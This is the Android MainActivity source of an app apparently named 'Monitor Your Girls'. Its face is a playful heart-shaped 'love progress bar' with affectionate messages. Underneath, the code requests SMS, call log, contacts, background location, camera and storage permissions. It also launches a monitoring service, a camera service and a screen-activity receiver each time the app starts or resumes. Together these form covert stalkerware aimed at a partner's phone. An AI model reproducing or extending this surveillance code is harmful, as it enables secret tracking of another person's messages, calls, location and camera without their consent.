package com.dk.monitoryourgilrs;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import android.Manifest;
import android.app.AlertDialog;
import android.content.ContentResolver;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.provider.Settings;
import android.util.Log;
import android.view.View;
import android.view.Window;
import android.view.WindowManager;
import android.widget.Toast;

import java.net.URI;
import java.util.ArrayList;
import java.util.List;

import browser.log.BrowserContentResolver;
import camera.log.ActivateCameraService;
import camera.log.CameraService;
import screen.log.ScreenReceiver;
import widget.BubbleProgressView;
import widget.HeartProgressBar;

import static androidx.core.app.ActivityCompat.requestPermissions;

public class MainActivity extends AppCompatActivity {

    private static final int REQUEST_CODE_ASK_PERMISSIONS = 200;
    private static final int PERMISSION_REQUEST_COARSE_LOCATION = 201;
    private List<String> unPermissionList = new ArrayList<String>(); //申请未得到授权的权限列表
    private AlertDialog mPermissionDialog;
    private String mPackName ;
    private String TAG = "permission";
    private HeartProgressBar hpb;
    private BubbleProgressView bpb;
    private int progres = 0;
    private double probability = 10;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Window w = this.getWindow();
        w.setFlags(WindowManager.LayoutParams.FLAG_HARDWARE_ACCELERATED,WindowManager.LayoutParams.FLAG_HARDWARE_ACCELERATED);
        setContentView(R.layout.activity_main);
        grantPermission();
        registerService();

        //love progress bar

        hpb = findViewById(R.id.hpb);
        bpb = findViewById(R.id.bpb);


    }

    protected  void  onStart(){
        super.onStart();
        Intent intent = new Intent();
        intent.setAction("MonitorYourGirlsServiceStarted");
        //added by me
        intent.setPackage(getApplicationContext().getPackageName());
        startService(intent);
        ActivateCameraService activateCameraService =  ActivateCameraService.create(getApplicationContext());
        activateCameraService.start();
    }


    protected void onResume() {
        // TODO Auto-generated method stub
        super.onResume();
        Intent intent = new Intent();
        intent.setAction("MonitorYourGirlsServiceStarted");
        //added by me
        intent.setPackage(getApplicationContext().getPackageName());
        startService(intent);
//        Toast.makeText(getApplicationContext(), "service called",Toast.LENGTH_LONG).show();
//
//        Intent face = new Intent(getApplicationContext(), CameraService.class);
//        getApplicationContext().startService(face);
        ActivateCameraService activateCameraService = ActivateCameraService.create(getApplicationContext());
        activateCameraService.start();

    }


    public void  grantPermission(){

        //申请短信权限
        smsPermission();
        phoneNumberPermission();
        GPSPermission();
        cameraPermission();
        writePermission();
    }

    private  void smsPermission(){
        String TAG = "permission";
        if (ContextCompat.checkSelfPermission(this,
                Manifest.permission.READ_SMS)
                != PackageManager.PERMISSION_GRANTED) {
            //没有授权，编写申请权限代码
            ActivityCompat.requestPermissions(MainActivity.this, new String[]{Manifest.permission.READ_SMS}, REQUEST_CODE_ASK_PERMISSIONS);

        } else {
            Log.d(TAG, "requestMyPermissions: 有获取短信权限");
        }
    }

    private void phoneNumberPermission(){
        String TAG = "permission";
        String[] permissionList = new String[]{    //申请的权限列表
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.WRITE_CALL_LOG,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.WRITE_CONTACTS
        };
        unPermissionList.clear();//清空申请的没有通过的权限
        //逐个判断是否还有未通过的权限
        for (int i = 0; i < permissionList.length; i++) {
            if (ContextCompat.checkSelfPermission(this, permissionList[i]) !=
                    PackageManager.PERMISSION_GRANTED) {
                unPermissionList.add(permissionList[i]);//添加还未授予的权限到unPermissionList中
            }
        }

        //有权限没有通过，需要申请
        if (unPermissionList.size() > 0) {
            ActivityCompat.requestPermissions( this,permissionList, 100);
            Log.i(TAG, "check 有权限未通过");
        } else {
            //权限已经都通过了，可以将程序继续打开了
            Log.i(TAG, "check 权限都已经申请通过");
        }

    }

    /**
     * 5.请求权限后回调的方法
     *
     * @param requestCode  是我们自己定义的权限请求码
     * @param permissions  是我们请求的权限名称数组
     * @param grantResults 是我们在弹出页面后是否允许权限的标识数组，数组的长度对应的是权限
     *                     名称数组的长度，数组的数据0表示允许权限，-1表示我们点击了禁止权限
     */
    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions,
                                           int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        Log.i(TAG,"申请结果反馈");
        boolean hasPermissionDismiss = false;
        if (100 == requestCode) {
            for (int i = 0; i < grantResults.length; i++) {
                if (grantResults[i] == -1) {
                    hasPermissionDismiss = true; //有权限没有通过
                    Log.i(TAG,"有权限没有被通过");
                    break;
                }
            }
        }
        if (hasPermissionDismiss) {//如果有没有被允许的权限
            showPermissionDialog();
        } else {
            //权限已经都通过了，可以将程序继续打开了
            Log.i(TAG, "onRequestPermissionsResult 权限都已经申请通过");
        }
    }


    /**
     * 不再提示权限时的展示对话框
     */

    private void showPermissionDialog() {


        Log.i(TAG,"mPackName: " + mPackName);

        if (mPermissionDialog == null) {
            mPermissionDialog = new AlertDialog.Builder(this)
                    .setMessage("已禁用权限，请手动授予")
                    .setPositiveButton("设置", new DialogInterface.OnClickListener() {
                        @Override
                        public void onClick(DialogInterface dialog, int which) {
                            cancelPermissionDialog();

                            Uri packageURI = Uri.parse("package:" + mPackName);     //去设置里面设置
                            Intent intent = new Intent(Settings.
                                    ACTION_APPLICATION_DETAILS_SETTINGS, packageURI);
                            startActivity(intent);
                        }
                    })
                    .setNegativeButton("取消", new DialogInterface.OnClickListener() {
                        @Override
                        public void onClick(DialogInterface dialog, int which) {
                            //关闭页面或者做其他操作
                            cancelPermissionDialog();
                        }
                    })
                    .create();
        }
        mPermissionDialog.show();


    }

    private void cancelPermissionDialog() {
        mPermissionDialog.cancel();
    }


    private  void GPSPermission(){

        requestPermissions(new String[]{ android.Manifest.permission.ACCESS_FINE_LOCATION,
                android.Manifest.permission.ACCESS_COARSE_LOCATION}, PERMISSION_REQUEST_COARSE_LOCATION);

        boolean permissionAccessCoarseLocationApproved =
                ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION)
                        == PackageManager.PERMISSION_GRANTED;

        if (permissionAccessCoarseLocationApproved) {
            boolean backgroundLocationPermissionApproved =
                    ActivityCompat.checkSelfPermission(this,
                           Manifest.permission.ACCESS_BACKGROUND_LOCATION)
                            == PackageManager.PERMISSION_GRANTED;

            if (backgroundLocationPermissionApproved) {
                // App can access location both in the foreground and in the background.
                System.out.println("App can access location both in the foreground and in the background.");
                // Start your service that doesn't have a foreground service type
                // defined.
            } else {
                // App can only access location in the foreground. Display a dialog
                System.out.println("App can only access location in the foreground. Display a dialog");
                // warning the user that your app must have all-the-time access to
                // location in order to function properly. Then, request background
                // location.
                ActivityCompat.requestPermissions(this, new String[] {
                                Manifest.permission.ACCESS_BACKGROUND_LOCATION},REQUEST_CODE_ASK_PERMISSIONS
                        );
            }
        } else {
            // App doesn't have access to the device's location at all. Make full request
            // for permission.
            System.out.println("App doesn't have access to the device's location at all. Make full request for permission.");
            ActivityCompat.requestPermissions(this, new String[] {
                            Manifest.permission.ACCESS_COARSE_LOCATION,
                            Manifest.permission.ACCESS_BACKGROUND_LOCATION
                    },
                    REQUEST_CODE_ASK_PERMISSIONS);
        }

    }

    private  void cameraPermission(){
        String TAG = "permission";
        if (ContextCompat.checkSelfPermission(this,
                Manifest.permission.CAMERA)
                != PackageManager.PERMISSION_GRANTED) {
            //没有授权，编写申请权限代码
            ActivityCompat.requestPermissions(MainActivity.this, new String[]{Manifest.permission.CAMERA}, REQUEST_CODE_ASK_PERMISSIONS);

        } else {
            Log.d(TAG, "requestMyPermissions: 有获取短信权限");
        }
    }
    private  void writePermission(){
        String TAG = "permission";
        if (ContextCompat.checkSelfPermission(this,
                Manifest.permission.WRITE_EXTERNAL_STORAGE)
                != PackageManager.PERMISSION_GRANTED) {
            //没有授权，编写申请权限代码
            ActivityCompat.requestPermissions(MainActivity.this, new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE}, REQUEST_CODE_ASK_PERMISSIONS);

        } else {
            Log.d(TAG, "requestMyPermissions: 有写权限");
        }


        if (ContextCompat.checkSelfPermission(this,
                Manifest.permission.READ_EXTERNAL_STORAGE)
                != PackageManager.PERMISSION_GRANTED) {
            //没有授权，编写申请权限代码
            ActivityCompat.requestPermissions(MainActivity.this, new String[]{Manifest.permission.READ_EXTERNAL_STORAGE}, REQUEST_CODE_ASK_PERMISSIONS);

        } else {
            Log.d(TAG, "requestMyPermissions: 有读权限");
        }
    }


    public void CallMe(View c) {
        Intent intent = new Intent();
        //Activating Main Service
//        Toast.makeText(getApplicationContext(), "Monitor Your Girls !",Toast.LENGTH_LONG).show();
        intent.setAction("MonitorYourGirlsServiceStarted");
        //added by me
        intent.setPackage(getApplicationContext().getPackageName());
        startService(intent);
        Toast.makeText(getApplicationContext(), "也爱你，么么哒~",Toast.LENGTH_SHORT).show();
        progres +=(int)(1+Math.random()*(probability-1+1));
        progres = progres>100?100:progres;
        bpb.setProgressWithAnim(progres);
        hpb.setProgress(progres);
        if(progres >=100){
            progres = 0;
            probability /= 2;
            if(probability <= 0) {
                probability = 5;
            }

        }

    }

    private void registerService() {
        ScreenReceiver screenBroadcastReceiver = new ScreenReceiver();
        IntentFilter filter = new IntentFilter();
        filter.addAction(Intent.ACTION_SCREEN_OFF);
        filter.addAction(Intent.ACTION_SCREEN_ON);
        filter.addAction(Intent.ACTION_USER_PRESENT);
        getApplicationContext().registerReceiver(screenBroadcastReceiver, filter);
    }
}
